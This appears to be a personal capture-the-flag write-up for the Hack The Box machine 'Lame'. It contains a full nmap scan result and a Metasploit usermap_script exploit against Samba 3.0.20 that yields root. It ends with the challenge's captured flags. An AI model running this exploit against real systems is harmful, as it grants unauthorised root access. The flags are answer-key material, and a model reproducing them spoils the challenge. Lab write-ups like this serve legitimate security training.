```json
Alias: Lame
Date: 15-04_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.10.3
```

# Lame
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
# Nmap 7.95 scan initiated Tue Apr 15 17:13:58 2025 as: nmap -sC -sV -oA nmap -Pn 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.20s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.31
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m29s, deviation: 2h49m45s, median: 26s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-04-15T08:15:02-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 15 17:15:13 2025 -- 1 IP address (1 host up) scanned in 74.61 seconds
```

---

# Exploitation

As we can see in the nmap result, the version of smb  is `3.0.20`. This is vulnerable to RCE by inputting special chars in the username field. Using metasploit:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS $IP
run
```

And we're root

---

# Flags
- 39eedf37df56f3abfed6381df63757bd
- cf5f70cbeb18aef4a78711bde719ec1b

#CTF